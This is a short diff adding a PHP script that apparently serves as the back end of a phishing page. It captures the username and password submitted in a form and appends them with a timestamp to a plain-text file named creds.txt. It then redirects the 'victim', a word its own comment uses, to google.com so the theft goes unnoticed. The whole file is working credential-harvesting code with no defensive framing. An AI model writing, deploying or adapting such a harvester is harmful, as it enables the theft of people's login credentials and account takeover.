@@ -1,0 +1,16 @@
+<?php
+date_default_timezone_set("Africa/Cairo");
+
+$user = isset($_POST['username']) ? $_POST['username'] : 'N/A';
+$pass = isset($_POST['password']) ? $_POST['password'] : 'N/A';
+
+$data = "[" . date("Y-m-d H:i:s") . "] "
+      . "Username: " . $user . " | "
+      . "Password: " . $pass . PHP_EOL;
+
+file_put_contents("creds.txt", $data, FILE_APPEND);
+
+// Redirect victim to a real website after submission
+header("Location: https://www.google.com");
+exit();
+?>
